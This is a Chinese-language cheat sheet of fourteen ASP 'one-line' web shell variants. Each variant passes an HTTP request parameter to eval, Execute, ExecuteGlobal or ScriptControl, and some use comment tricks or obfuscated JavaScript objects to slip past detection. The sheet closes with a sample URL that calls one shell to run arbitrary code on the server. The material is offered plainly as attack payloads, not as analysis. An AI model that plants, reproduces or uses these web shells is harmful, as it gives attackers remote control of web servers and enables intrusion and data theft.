[+]ASP一句话

1) <%eval request("sb")%>
2) <%execute request("sb")%>
3) <%execute(request("sb"))%>
4) <%execute request("sb")%><%'<% loop <%:%>
5) <%'<% loop <%:%><%execute request("sb")%>
6) <%execute request("sb")'<% loop <%:%>
7) <script language=vbs runat=server>eval(request("sb"))
8) %><%Eval(Request(chr(35)))%><%
9) <%eval request("sb")%>
10） <%eval_r(Request("0x001"))%>
11） <%ExecuteGlobal request("sb")%>
12） if Request("sb")<>"" then ExecuteGlobal request("sb") end if
13） <%@LANGUAGE="JAVASCRIPT" CODEPAGE="65001"%>
     <%var lcx = {'名字' : Request.form('#'), '性别' : eval, '年龄' : '18', '昵称' : 'o040'};lcx.性别((lcx.名字)+'');%>
14） <%
     Set o = Server.CreateObject("ScriptControl")
     o.language = "vbscript"
     o.addcode(Request("SubCode")) '参数SubCode作为过程代码
     o.run "e",Server,Response,Request,Application,Session,Error '参数名e 调用之，同时压入6个基对象作为参数
     %>

[+]调用示例：
·程序代码
	http://localhost/tmp.asp?SubCode=sub%20e%28Server,Response,Request,Application,Session,Error%29%20eval%28request%28%22v%22%29%29%20end
	%20sub&v=response.write%28server.mappath%28%22tmp.asp%22%29%29
